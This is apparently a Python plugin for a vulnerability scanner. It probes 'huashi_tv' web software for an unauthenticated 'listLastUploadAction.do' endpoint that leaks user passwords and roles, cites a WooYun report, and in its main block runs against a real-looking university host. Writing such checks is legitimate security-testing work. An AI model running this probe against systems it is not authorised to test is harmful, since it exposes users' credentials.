#!/usr/bin/env python
# -*- coding: utf-8 -*-
#__Author__ = huashi password
#_Function_ = 插件格式
#_FileName_ = Plugin_Format.py
#__Refer___ = http://www.wooyun.org/bugs/wooyun-2010-0100173
#___Flag___ = 438b1eb36b7e244b
def assign(service, arg):
    if service == 'huashi_tv':
        return True, arg

def audit(arg):
    payload = "listLastUploadAction.do?num=5"
    target = arg + payload
    code, head, body, errcode, final_url = curl.curl2(target)

    if code == 200 and 'password' in body and 'uploadUser' in body and 'roleId' in body:
        security_warning(target)

if __name__ == '__main__':
    from dummy import *
    audit(assign('huashi_tv', 'http://zkpm.zust.edu.cn/')[1])